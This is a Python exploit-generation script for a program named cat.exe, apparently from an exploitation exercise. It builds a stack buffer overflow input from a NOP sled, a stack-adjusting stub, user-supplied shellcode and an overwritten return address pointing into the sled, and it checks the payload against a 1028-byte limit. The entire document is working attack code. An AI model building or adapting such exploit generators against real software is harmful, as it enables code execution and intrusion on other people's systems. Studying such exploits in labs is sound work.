"""

## `exploit.py`

> ***This is the final exploit generation script for `cat.exe`.***

"""

def main():
	import argparse
	import re
	parser = argparse.ArgumentParser(description='Exploit cat.')
	parser.add_argument('payload', type=argparse.FileType('r'), help="The file containing the payload")
	parser.add_argument('--exploit', type=argparse.FileType('wb'), default="exploit.dat", help="The output file.")
	parser.add_argument('--silent', action='store_true', help='No other output.')
	args = parser.parse_args()

	if not args.silent:
		print("   Payload name: " + re.search("'(.*)',", str(args.payload)).group(1))

	payload = args.payload.read(0x1000)
	payload = bytearray.fromhex(payload)
	args.exploit.write(generate(payload, vars(args)))
	
	if not args.silent:
		print("Exploit created: " + re.search("'(.*)',", str(args.exploit)).group(1))

	args.payload.close()
	args.exploit.close()

def generate(payload, args={}):
	'''
	Generates an exploit for cat.exe
	
	Arguments
	  payload: bytearray containing the payload.
	
	Returns
	  An exploit for cat.exe
	  
	'''
	from struct import pack
	
	args["silent"] = args["silent"] if "silent" in args else True
	
	address = 0x19FA54
	maximum = 1028

	stub =  b"\x81\xC4\xEC\xFB\xFF\xFF"
	
	if len(payload) > maximum - len(stub):
		if not args["silent"]:
			print("Payload size is too large...")
		exit()
	
	nopsize = maximum - len(payload) - len(stub)
	middle = int(nopsize / 2)

	if not args["silent"]:
		print("   Payload size:  " + str(len(payload)))
		print("      Stub size:    " + str(len(stub)))
		print("  Nop sled size:  " + str(nopsize))
		print("     Total size: " + str(nopsize + len(payload) + len(stub)))
		print("    Mid address: " + hex(address + middle))
		
	return b"\x90" * nopsize + stub + payload + pack('i', address + middle)

if __name__ == "__main__": main()